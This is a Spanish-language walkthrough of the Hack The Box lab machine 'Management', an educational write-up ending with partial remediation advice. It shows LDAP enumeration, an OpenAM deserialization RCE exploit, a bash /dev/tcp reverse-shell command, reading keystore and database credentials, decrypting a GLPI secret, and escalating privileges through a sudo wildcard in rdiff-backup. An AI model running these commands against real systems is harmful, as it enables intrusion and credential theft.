<!-- meta
title: Management
os: Linux
difficulty: Easy
vectors: `LDAP` `OpenAM (CVE-2026-33439)` `GLPI (libsodium)` `rdiff-backup`
date: Nov 2026
-->

# Introducción al documento
La máquina Management en Hack The Box es un laboratorio basado en Linux calificado con una dificultad *Easy*, creado por TheCyberGeek y lanzado en septiembre de 2026, y está centrado en explotación web, descifrado de credenciales y abuso de permisos sudo.

En esta ocasión veremos tecnologías clave como lo son *OpenAM*, *OpenDJ (LDAP)*, *GLPI* y *rdiff-backup*.

**Enlace oficial de la maquina:** https://app.hackthebox.com/machines/Management

## Cadena de ataque
### 1. Enumeración y acceso inicial
- Al escanear los puertos se descubren dominios y subdominios
- El subdominio aloja un portal de autenticación basado en *OpenAM 16.0.5*. Esta versión es vulnerable a *CVE-2026-33439*, lo que permite una *RCE* sin autenticación mediante un *exploit* en *Python* para obtener una *reverse shell*.

### 2. Explotación y ataques
- Dentro del sistema, la enumeración lleva a una instalación de *GLPI* en lugar de los archivos de configuración de *OpenAM*.
- Extrayendo la contraseña cifrada de la base de datos de *GLPI* y usando la clave secreta almacenada en una ruta, se descifra la credencial del usuario local, permitiendo acceder vía *SSH* y leer la primera *flag*.

### 3. Escalada de privilegios
- Al revisar los privilegios sudo del usuario, se detecta una regla mal configurada al final.
- Aprovechando las opciones, es posible anular la restricción de directorio original y respaldar */root* en una carpeta accesible para el usuario, obteniendo así acceso total.

# FASE DE ESCANEO
**1. Conectarse a la maquina:**
```bash
sudo openvpn <NOMBRE_MAQUINA>
```
- Asumimos que ya sabes como conectarte a una maquina en HTB, sino puedes consultar el tutorial de conexión para Hack The Box: https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access

**2. Hacer ping a la IP que será atacada:**
```bash
ping <TARGET_IP>
```

**3. Añadir la IP a /etc/hosts con alias management.htb:**
```bash
sudo nano /etc/hosts
<TARGET_IP> management.htb
```
- Se añade la IP a /etc/hosts para traducir un nombre privado (como management.htb) a tu dirección IP real.
- ¿Por qué sí hacerlo? Como los dominios .htb no existen en internet, tu computadora no los encontrará si no los anotas ahí, y muchas webs de HTB bloquean el acceso directo por IP o esconden subdominios (como sso.management.htb) que solo aparecen si las llamas por su nombre.
- ¿Por qué no hacerlo? No hace falta si la web abre y funciona normal poniendo solo la IP en el navegador, o si la máquina ni siquiera tiene web y solo vas a conectarte directo por IP a servicios como SSH o FTP.

**4. Lanzar un escaneo Nmap hacia la IP de la maquina:**
```bash
nmap -sVC <TARGET_IP> -oN escaneo.txt
```
O también se puede usar estos parámetros para analizar absolutamente todos los puertos de forma ágil pero sin mucha información extra
```bash
nmap -p- --min-rate=1000 -T4 -Pn <TARGET_IP> -oN escaneo.txt
```

**5. Usaremos el reporte completo de Nmap con ```-sVC``` para ver bien a que nos enfrentamos:**

<details open>
<summary>Ver output completo de Nmap</summary>

```text
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-22 15:11 -0300
Nmap scan report for management.htb (<TARGET_IP>)
Host is up (0.18s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http        nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://management.htb/
443/tcp   open  ssl/http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Management \xE2\x80\x94 Managed IT &amp; Infrastructure
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
4444/tcp  open  ssl/krb524?
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
50389/tcp open  ldap        (Anonymous bind OK)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi? new-service :
SF-Port4444-TCP:V=7.991%T=SSL%I=7%D=11/22%Time=6B0330A7%P=x86_64-pc-linux-
SF:gnu%r(LDAPSearchReq,55,"0E\x02\x01\x07d@\x04\x000<0:\x04\x0bobjectClass
SF:1\+\x04\x03top\x04\x0bds-root-dse\x04\x17ds-cfg-root-dse-backend0\x0c\x
SF:02\x01\x07e\x07\n\x01\0\x04\0\x04\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 111.16 seconds
```
</details>
­­

Con el ```-sVC``` deducimos que hay subdominios sobre el dominio principal (*.management.htb) y que además con el puerto **50389** vemos que podemos acceder sin credenciales gracias al mensaje de **Anonymous bind OK**.

**6. Añadir el subdominio de la IP Target a /etc/hosts con alias sso.management.htb:**
```bash
sudo nano /etc/hosts
<TARGET_IP> management.htb sso.management.htb
```

# FASE DE ENUMERACIÓN
**7. Enumeración de fuzzing para descubrir mas subdominios**. Usaremos FFUF junto a una wordlist que es muy usada para descubrir subdominios (seclists):
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://management.htb -H "Host: FUZZ.management.htb" -ac
```
- El parámetro ```-w``` es para especificar una wordlist.
- El parámetro ```-u``` para indicar la URL a atacar.
- El parámetro ```-H``` para agregar o modificar headers HTTP personalizados en cada petición que envía la herramienta.

> [!IMPORTANT]
> **OJO:** Si no nos arroja ningún resultado no es que haya habido errores (si es que no lo indica el contador de errores) sino que no encontró palabras comunes de la wordlist seleccionada, por ende avanzamos altiro al siguiente paso (este paso es omitible)

**8. Enumeración de LDAP:** Ya vimos que en el puerto **50389** usa el servicio de LDAP (*Lightweight Directory Access Protocol*) el cúal es un protocolo abierto y estándar de red para consultar, administrar y autenticar información en servicios de directorio sobre IP.
Su mensaje nos indica que nos deja acceder a algo pero no sabemos el que (Deducimos eso gracias al mensaje de **Anonymous bind OK**)
Por ende no haremos un ataque directos sino mas bien una enumeración sin credenciales ya que el servidor lo permite:
```bash
ldapsearch -x -H ldap://<TARGET_IP>:50389 -b "" -s base "(objectclass=*)" "*" +
```

**9. Leemos detenidamente el output anterior:**

<details open>
<summary>Ver output completo de ldapsearch</summary>

```ldif
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: * + 
#

#
dn:
objectClass: top
objectClass: ds-root-dse
objectClass: ds-cfg-root-dse-backend
etag: 0000000050405fb1
vendorName: Open Identity Platform Community
vendorVersion: OpenDJ Server 5.0.3
supportedLDAPVersion: 2
supportedLDAPVersion: 3
entryDN:
supportedControl: 1.2.826.0.1.3344810.2.3
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.3.6.1.1.12
supportedControl: 1.3.6.1.1.13.1
supportedControl: 1.3.6.1.1.13.2
supportedControl: 1.3.6.1.4.1.26027.1.5.2
supportedControl: 1.3.6.1.4.1.42.2.27.8.5.1
supportedControl: 1.3.6.1.4.1.42.2.27.9.5.2
supportedControl: 1.3.6.1.4.1.42.2.27.9.5.8
supportedControl: 1.3.6.1.4.1.4203.1.10.1
supportedControl: 1.3.6.1.4.1.4203.1.10.2
supportedControl: 1.3.6.1.4.1.7628.5.101.1
supportedControl: 2.16.840.1.113730.3.4.12
supportedControl: 2.16.840.1.113730.3.4.16
supportedControl: 2.16.840.1.113730.3.4.17
supportedControl: 2.16.840.1.113730.3.4.18
supportedControl: 2.16.840.1.113730.3.4.19
supportedControl: 2.16.840.1.113730.3.4.2
supportedControl: 2.16.840.1.113730.3.4.3
supportedControl: 2.16.840.1.113730.3.4.4
supportedControl: 2.16.840.1.113730.3.4.5
supportedControl: 2.16.840.1.113730.3.4.9
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: CRAM-MD5
supportedSASLMechanisms: DIGEST-MD5
entryUUID: d41d8cd9-8f00-3204-a980-0998ecf8427e
hasSubordinates: false
structuralObjectClass: ds-root-dse
subschemaSubentry: cn=schema
supportedAuthPasswordSchemes: SHA256
supportedAuthPasswordSchemes: SHA1
supportedAuthPasswordSchemes: PBKDF2-HMAC-SHA256
supportedAuthPasswordSchemes: SHA384
supportedAuthPasswordSchemes: PKCS5S2
supportedAuthPasswordSchemes: SHA512
supportedAuthPasswordSchemes: PBKDF2-HMAC-SHA512
supportedAuthPasswordSchemes: MD5
supportedAuthPasswordSchemes: PBKDF2
supportedExtension: 1.3.6.1.4.1.4203.1.11.1
supportedExtension: 1.3.6.1.4.1.4203.1.11.3
supportedExtension: 1.3.6.1.1.21.3
supportedExtension: 1.3.6.1.1.8
supportedExtension: 1.3.6.1.1.21.1
supportedExtension: 1.3.6.1.4.1.26027.1.6.3
supportedExtension: 1.3.6.1.4.1.26027.1.6.2
supportedExtension: 1.3.6.1.4.1.26027.1.6.1
supportedExtension: 1.3.6.1.4.1.1466.20037
namingContexts: dc=management,dc=htb
numSubordinates: 0
supportedFeatures: 1.3.6.1.1.14
supportedFeatures: 1.3.6.1.4.1.4203.1.5.1
supportedFeatures: 1.3.6.1.4.1.4203.1.5.2
supportedFeatures: 1.3.6.1.4.1.4203.1.5.3

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
</details>
­­

De aquí sacamos los metadatos del servicio de directorio, como por ejemplo la version y contexto raíz:
- ```vendorVersion: OpenDJ Server 5.0.3```
- ```namingContexts: dc=management,dc=htb```

**10.** Ahora que sabemos la raíz real lo siguiente es cambiar el enfoque de búsqueda para leer el contenido interno, para ello cambiaremos el parámetro ```-b ""``` que busca en una base vacía, ahora buscaremos la base que acabamos de sacar:
```
ldapsearch -x -H ldap://<TARGET_IP>:50389 -b "dc=management,dc=htb" "(objectclass=*)" "*" +
```

**11. Analizaremos output y sacaremos las conclusiones correctas:**

<details open>
<summary>Ver output completo de ldapsearch</summary>

```ldif
# extended LDIF
#
# LDAPv3
# base <dc=management,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: * + 
#

# search result
search: 2
result: 0 Success

# numResponses: 1
```
</details>
­­

Ahora bien, el comando fue un éxito pero nos encontramos con una pared. Cuando Nmap indicó **Anonymous bind OK**, confirmó que el servidor acepta establecer una conexión sin credenciales (*bind*) y leer los metadatos raíz (*Root DSE*).
Sin embargo, las reglas de control de acceso internas (*ACIs*) bloquean a los usuarios anónimos para que no puedan leer los registros dentro de ```dc=management,dc=htb.```

LDAPv3 tiene un comportamiento silencioso que por diseño de seguridad, cuando una consulta anónima no tiene permisos para ver una rama del directorio, el servidor no devuelve un error de "acceso denegado" (lo que revelaría que los datos existen), sino que responde con *0 Success* y cero resultados.

Por ende concluimos con que ya comrpobamos que el directorio *LDAP* no filtra usuarios de forma anónima; necesitaremos credenciales válidas antes de volver a consultarlo.

**12.** El siguiente paso será ya con el puerto **50389** descartado por ahora, ver otro frente principal del escaneo principal: el sitio web *HTTPS* en el puerto **443** con los dos dominios que configuramos en ```/etc/hosts``` (**sso.management.htb y management.htb**).

Cuando buscamos en la web https://sso.management.htb nos aparece un portal *SSO/LOGIN*; solicita *username* y *password.*
Mientras que en *management.htb* una página web completa sobre una plataforma de soporte IT.

De *sso.management.htb* vemos que corre *OpenAM Community edition* mantenido por *Open Identity Platform* (El mismo ecosistema de *OpenDJ* que vimos en el puerto *LDAP*) En soluciones de identidad como *OpenAM*, conocer la versión exacta (mirando el código fuente de la página, archivos JavaScript o peticiones de red) es clave para saber si tiene fallos públicos conocidos o qué rutas expone.

Antes de proceder con el siguiente paso necesitamos analizar cautelosamente la web de *management.htb* ya que las páginas corporativas suelen revelar nombres de empleados, correos (útiles para armar una lista de usuarios válidos para el *login*) o pistas sobre tecnologías internas.
También interesa saber a dónde redirige exactamente el botón ```Client login```, y si lo hacemos nos damos cuenta que nos lleva exactamente a la misma página de *sso.management.htb*

Para esto nos meteremos desde el navegador que sea y ejecutamos el atajo ```Ctrl + U``` para ver el código fuente de la página:

<details open>
<summary>Ver output completo del html</summary>

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>OpenAM</title>
    </head>
    <!--[if IE 9]>
    <body style="display:none" class="ie9">
    <![endif]-->
    <!--[if (gt IE 9)|!(IE)]><!-->
    <body style="display:none">
    <!--<![endif]-->
        <div id="messages" class="clearfix"></div>
        <div id="wrapper">Loading...</div>
        <div id="popup">
            <div id="popup-content" class="radious"></div>
        </div>
        <footer id="footer" class="footer text-muted"></footer>
        <script src="libs/base64-1.0.0-min.js"></script>
        <script type="text/javascript">
            var require = {
                urlArgs : "v=16.0.5",
                deps : ['main']
            };
        </script>
        <script src="libs/requirejs-2.3.7-min.js"></script>
    </body>
</html>
```
</details>
­­

La interfaz del portal no está escrita directamente en el *HTML* inicial, sino que se construye dinámicamente en el navegador cargando módulos de JavaScript (a partir de ```deps : ['main']```).

Dentro de la configuración de ```require```, ese parámetro se utiliza habitualmente para evitar que el navegador cargue archivos *JavaScript* antiguos desde la caché (*cache-busting*), dejando expuesta la versión exacta de la aplicación (**16.0.5**).
Sabiendo esta información buscamos alguna vulnerabilidad de esta versión específica en internet o alguna BBDD de (valga la redundancia) *vulnerabilidades/exploit*.

Encontramos que esta versión tiene asociada la vulnerabilidad ```CVE-2026-33439``` (OpenAM Pre-Auth RCE) que en palabras simples, esta falla permite que un atacante tome el control total del servidor de forma remota, sin necesidad de tener usuario ni contraseña.

OpenAM utiliza un *framework* antiguo llamado *JATO* para algunas de sus páginas de interfaz de usuario (como la página de restablecimiento de contraseñas). *JATO* emplea un parámetro denominado ```jato.clientSession``` que se deserializa (es decir, se convierte de bytes sin procesar a un objeto Java) sin realizar ninguna comprobación de seguridad.

En términos sencillos: si es posible controlar los *bytes* que se deserializan, se puede lograr que el servidor cree objetos *Java* arbitrarios; mediante una cadena de gadgets (*gadget chain*) adecuada, esto puede derivar en la ejecución remota de código, sin necesidad de iniciar sesión.

Una versión anterior de este mismo fallo (relacionada con el parámetro ```jato.pageSession```) se corrigió mediante la implementación de una lista blanca de clases seguras. 
Sin embargo, la solución resultó incompleta, ya que el parámetro asociado ```jato.clientSession``` permaneció sin protección. Precisamente en esto consiste la vulnerabilidad ```CVE-2026-33439```.

- Versiones afectadas: ```OpenAM ≤ 16.0.5```
- Punto de entrada: ```/openam/ui/PWResetUserValidation``` (así como otras páginas basadas en *JATO ViewBean*)


# FASE DE EXPLOITING
**13.** Una vez conocida la vulnerabilidad clonaremos el siguiente repositorio en nuestra maquina de *kali linux* (*Script/Exploit* autónomo de Python que no requiere dependencias) ```infernosalex/CVE-2026-33439-Python-PoC```
```bash
git clone https://github.com/infernosalex/CVE-2026-33439-Python-PoC
cd CVE-2026-33439-Python-PoC
```

Una vez dentro de la carpeta del exploit leemos el ```readme.md``` para ver su uso y procedemos con las primeras ejecuciones, para ello usaremos el "punto de entrada" ```openam/ui/PWResetUserValidation```:
```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
```

**14. Analizamos el resultado de la ejecución anterior:**

<details open>
<summary>Ver output completo</summary>

```bash
[+] HTTP 200 
uid=996(openam) gid=987(openam) groups=987(openam)
```
</details>
­­

- ```HTTP 200``` Significa que la ejecución fue éxitosa
- El ```uid=996``` es el *USER ID*: un usuario interno sin privilegios de *root* llamado *openam.*
- El ```gid=987``` es el *Group ID*: indica que el grupo principal que pertenece el usuario 996 y también se llama *openam.*
- Finalmente el ```groups=987``` lista todos los grupos a los que pertenece la cuenta (en este caso únicamente a su propio grupo, osea el *openam*).

en palabras sencillas tenemos básicamente un ***RCE sin autentificación*** como el usuario *openam*, algo que es sumamente peligroso en un sistema real y facilmente puede comprometer todo un sistema si es usado de mala manera.

**15. Iniciamos un servidor oyente o listener para ejecutar correctamente nuestro reverse shell con netcat (en un puerto cualquiera):**
```bash
nc -lvnp 4444
```

acontinuación lanzamos el *payload* con un *reverse shell*
```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'bash -c "bash -i >& /dev/tcp/<LOCAL_IP>/4444 0>&1"'
```

**16. Ahora vemos el resultado y estabilizamos la shell**. Una vez ejecutado vamos a la terminal que tenga el listener y verificamos que efectivamente estamos dentro:

<details open>
<summary>Ver output completo</summary>

```bash
connect to [<LOCAL_IP>] from (UNKNOWN) [<TARGET_IP>] 39740
bash: cannot set terminal process group (1727): Inappropriate ioctl for device
bash: no job control in this shell
openam@management:/$ █
```
</details>
­­

Pongamos el comando ```id``` por ejemplo y si todo salió bien nos deberá de arrojar exactamente la información de antes:

<details open>
<summary>Ver output completo</summary>

```bash
uid=996(openam) gid=987(openam) groups=987(openam)
```
</details>
­­

Ahora dentro de la shell subimos este código para que podamos interactuar de una forma más cómoda con la shell y poder usar tabulaciones o caracteristícas normales de una shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Luego ejecutamos Ctrl+Z y ya después en la misma terminal ejecutamos:
```bash
stty raw -echo; fg
```

**17. Ahora pasemos a la busqueda de credenciales.** Para ello notemos que la enumeración básica reveló un directorio ```/home/owen``` al que aún no podíamos acceder, así como dos aplicaciones interesantes instaladas en ```/opt```: ```OpenAM``` y ```GLPI``` (una herramienta de gestión de activos informáticos).

así que necesitamos analizar los archivos de configuración de ```OpenAM```, ya que mantiene un almacén de claves (*keystore.jceks*) que guarda algunas contraseñas de cuentas de servicio, y pudimos leer dichas contraseñas. ejecutamos los siguientes comandos:
```bash
cat /opt/openam/config/openam/.storepass
cat /opt/openam/config/openam/.keypass
```

ambas muestran los siguientes dos resultados:


<details open>
<summary>Ver output completo</summary>

```bash
S9n50IUgcRe1Lkj/7gp5OpdZHf1bphqh
```
</details>

<details open>
<summary>Ver output completo</summary>

```bash
changeit
```
</details>
­­

Se revisaron los archivos de configuración de *OpenAM* en ```/opt/openam``` sin encontrar credenciales reutilizables para *SSH*, por lo que se continuó inspeccionando la instalación de *GLPI* en ```/opt/glpi```.

**18. Análisis de GLPI**
```bash
cat /opt/glpi/config/config_db.php
```

<details open>
<summary>Ver output completo</summary>

```php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```
</details>
­­

Como vemos acabamos de encontrar credenciales de una **Bases de Datos.**

**19.** Con esta información vamos a empezar a buscar las credenciales reales de Owen para conectarse via SSH. Primero hay que consultar la **BBDD**: *GLPI* puede sincronizar sus usuarios con un directorio *LDAP* externo. Los ajustes de conexión (incluida la contraseña de vinculación) se almacenan en la tabla ```glpi_authldaps```.
```bash
mysql -u glpi -p'8rhu0L6Pw4Y7' -h 127.0.0.1 glpidb -e "SELECT * FROM glpi_authldaps\G"
```

<details open>
<summary>Ver output completo sql</summary>

```sql
*************************** 1. row ***************************
                       id: 1
                     name: Management Directory
                     host: sso.management.htb
                   basedn: dc=management,dc=htb
                   rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
                     port: 389
                condition: NULL
              login_field: uid
               sync_field: uid
                  use_tls: 0
              group_field: NULL
          group_condition: NULL
        group_search_type: 0
       group_member_field: NULL
             email1_field: NULL
           realname_field: NULL
          firstname_field: NULL
              phone_field: NULL
             phone2_field: NULL
             mobile_field: NULL
            comment_field: NULL
                   use_dn: 1
              time_offset: 0
             deref_option: 0
              title_field: NULL
           category_field: NULL
           language_field: NULL
                 date_mod: 2026-06-02 01:25:41
                  comment: Primary directory bind used to synchronise managed client accounts.
               is_default: 0
                is_active: 1
            rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
registration_number_field: NULL
             email2_field: NULL
             email3_field: NULL
             email4_field: NULL
           location_field: NULL
        responsible_field: NULL
                 pagesize: 0
            ldap_maxlimit: 0
     can_support_pagesize: 0
            picture_field: NULL
         begin_date_field: NULL
           end_date_field: NULL
            date_creation: 2026-06-02 01:25:41
         inventory_domain: NULL
             tls_certfile: NULL
              tls_keyfile: NULL
                 use_bind: 1
                  timeout: 10
              tls_version: NULL
```
</details>
­­

Encontramos los campos que contienen información útil:
- ```name: Management Directory```
- ```cn=svc-glpi,ou=services,dc=management,dc=htb```
- ```rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==```

con estos datos avanzaremos al siguiente paso el cual consiste en entender como funciona la protección de una contraseña.
Esta contraseña no está cifrada mediante hash como las contraseñas de usuario habituales (que emplean *bcrypt*, un método unidireccional). Debe ser reversible, ya que *GLPI* necesita la contraseña original en texto plano cada vez que se conecta al servidor *LDAP* para sincronizar las cuentas.

*GLPI 10.x* cifra este tipo de secreto utilizando *XChaCha20-Poly1305* de *libsodium*, un algoritmo moderno de cifrado autenticado.
El bloque de datos cifrados se estructura de la siguiente manera:

```text
[ 24-byte nonce ] + [ ciphertext + authentication tag ]
```

- El ```nonce``` es un valor aleatorio que se utiliza una sola vez por cada cifrado (no es secreto y se almacena junto con los datos).
- La ​​clave secreta utilizada realmente para cifrar o descifrar se almacena por separado en: ```/opt/glpi/config/glpicrypt.key```

Para descifrar: divide el *blob* en ```nonce``` + ```texto cifrado``` y, a continuación, ejecuta la función de descifrado de *libsodium* con la clave.

```php
php -r "
\$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
\$ciphertext = base64_decode('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==');
\$nonce = substr(\$ciphertext, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
\$data  = substr(\$ciphertext, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
\$plain = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(\$data, \$nonce, \$nonce, \$key);
echo \$plain . PHP_EOL;
"
```

y nos devuelve esta cadena de caracteres:

<details open>
<summary>Ver output</summary>

```text
WpczC40GhTbk
```
</details>
­­
Lo que acabmos de obtener era la última pieza para iniciar sesión como el usuario **Owen**.

**20. Iniciar por SSH con el usuario de Owen.**
```bash
ssh owen@management.htb
# Acá cuando te pida la contraseña pones WpczC40GhTbk
enter password: █
```

<details open>
<summary>Ver output completo</summary>

```bash
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Nov 22 08:03:44 PM UTC 2026

  System load:           0.08
  Usage of /:            45.6% of 10.42GB
  Memory usage:          42%
  Swap usage:            0%
  Processes:             233
  Users logged in:       0
  IPv4 address for eth0: <TARGET_IP>
  IPv6 address for eth0: dead:beef::a0de:adff:fecd:e759
Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sun Nov 22 20:03:45 2026 from 127.0.0.1
owen@management:~$ █
```
</details>
­­

Finalmente logramos acceder al usuario de **Owen** y ahora si podemos ir al directorio ```/home``` para sacar la user *flag*, o verificar que ya estamos en este para ver la *flag*

```bash
owen@management:~$ pwd
/home/owen
owen@management:~$ cat user.txt
<FLAG>
```

# FASE DE ESCALADA DE PRIVILEGIOS
**21.** Una vez ya obtenida la flag procedemos a entrarnos de lleno a la busqueda de la bandera root, para ello iniciamos en este mismo directorio comprobando los permisos de administrador.

```bash
sudo -l
```

<details open>
<summary>Ver output completo</summary>

```bash
Matching Defaults entries for owen on management:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *
```
</details>
­­

Analizemos este mensaje un momento:

```bash
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *
```

Ese asterisco al final es peligroso. Significa que ```sudo``` permitirá al usuario ```owen``` añadir cualquier argumento adicional después de la parte fija del comando.

```rdiff-backup``` analiza sus argumentos de izquierda a derecha; si una misma opción aparece dos veces, prevalece la última.
Por tanto, si logramos introducir un segundo ```--restrict-path /```, este anula por completo la restricción original que es (```--restrict-path /opt/backup```), otorgando al proceso ```rdiff-backup --server``` que se ejecuta con privilegios de ```root``` ó acceso a todo el sistema de archivos.

¿Cómo podemos inyectar un segundo ```--restrict-path``` sin escribirlo directamente?

No podemos simplemente ejecutar ```sudo rdiff-backup --server ... --restrict-path /``` por nuestra cuenta; ```sudo``` solo permite el comando fijo predefinido seguido de cualquier otro argumento, pero necesitamos que el servidor se ejecute incluyendo esa opción inyectada.

El truco reside en la opción ```--remote-schema``` de ```rdiff-backup```, que permite al cliente personalizar el comando utilizado para iniciar el proceso del servidor, empleando ```%s``` como marcador de posición para el nombre de host (*hostname*) de la ubicación de destino.

```rdiff-backup``` interpreta las ubicaciones siguiendo el formato ```nombre_de_host::ruta```. Así pues, la ubicación:

```bash
/::/root
```

- Se analiza como ```nombre de host = /``` y ```ruta = /root```.
Cuando el cliente construye el comando del servidor, sustituye ```%s``` por dicho nombre de host, es decir, ```/```.

**22. Usaremos este comando para explotar esta vulnerabilidad:**
```bash
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root /tmp/root_backup
```

<details open>
<summary>Ver output completo</summary>

```bash
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.
NOTE: Starting mirror from source path /root to destination path /tmp/root_backup
```
</details>
­­

Así es como exactamente es que se ejecuta en el lado del servidor como root:

```bash
sudo /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup \
  --restrict-mode read-only \
  --restrict-path / # inyectado, anula al primero
```

Dado que el segundo parámetro ```--restrict-path /``` prevalece, la restricción queda efectivamente eliminada, y el proceso del servidor que pertenece al usuario *root* realiza una copia de seguridad de todo el directorio ```/root``` en ```/tmp/root_backup```, el cual es propiedad del usuario *owen*.

**23. Ejecutar los ultimos comandos para agarrar la bandera root:**
```bash
ls -la /tmp/root_backup
cat /tmp/root_backup/root.txt
```

<details open>
<summary>Ver output completo</summary>

```bash
owen@management:~$ ls -la /tmp/root_backup
total 44
drwx------  7 owen owen 4096 Nov 22 17:39 .
drwxrwxrwt 17 root root 4096 Nov 22 20:12 ..
lrwxrwxrwx  1 owen owen    9 Nov 22 20:12 .bash_history -> /dev/null
-rw-r--r--  1 owen owen 3106 Apr 22  2024 .bashrc
drwx------  3 owen owen 4096 Sep  7 11:41 .cache
drwx------  3 owen owen 4096 Sep  7 11:41 .config
drwxr-xr-x  3 owen owen 4096 Sep  7 11:41 .local
-rw-r--r--  1 owen owen  161 Apr 22  2024 .profile
drwx------  3 owen owen 4096 Nov 22 20:12 rdiff-backup-data
-rw-r-----  1 owen owen   33 Nov 22 17:39 root.txt
drwx------  2 owen owen 4096 Sep  7 11:41 .ssh
-rw-r--r--  1 owen owen  177 Sep  7 11:06 .wget-hsts
owen@management:~$ cat /tmp/root_backup/root.txt
<FLAG>
```
</details>
­­

# FASE DE REMEDIACION Y MITIGACIÓN
Para cerrar los vectores de ataque identificados durante la evaluación, se recomiendan las siguientes medidas técnicas:

- **Actualización de OpenAM (`CVE-2026-33439`):**
   - **Problema:** El *framework JATO* deserializa el parámetro `jato.clientSession` sin validar los tipos de objetos entrantes, permitiendo la ejecución remota de código antes de la autenticación.
   - **Solución propuesta:** Actualizar OpenAM Community Edition a una versión parcheada posterior a la `16.0.5` que incluya listas blancas (*whitelisting*) estrictas sobre las clases permitidas durante la deserialización. Como medida temporal, restringir el acceso externo a las rutas administrativas y de restablecimiento (`/openam/ui/PWResetUserValidation`) mediante reglas en el *proxy* inverso (*Nginx*).
- **Aislamiento de permisos en archivos de configuración (GLPI):**
   - **Problema:** El usuario de servicio `openam` tiene permisos de lectura sobre `/opt/glpi/config/config_db.php` y `/opt/glpi/config/glpicrypt.key`, lo que permite extraer las credenciales de la base de datos y descifrar los secretos almacenados en `glpi_authldaps`.
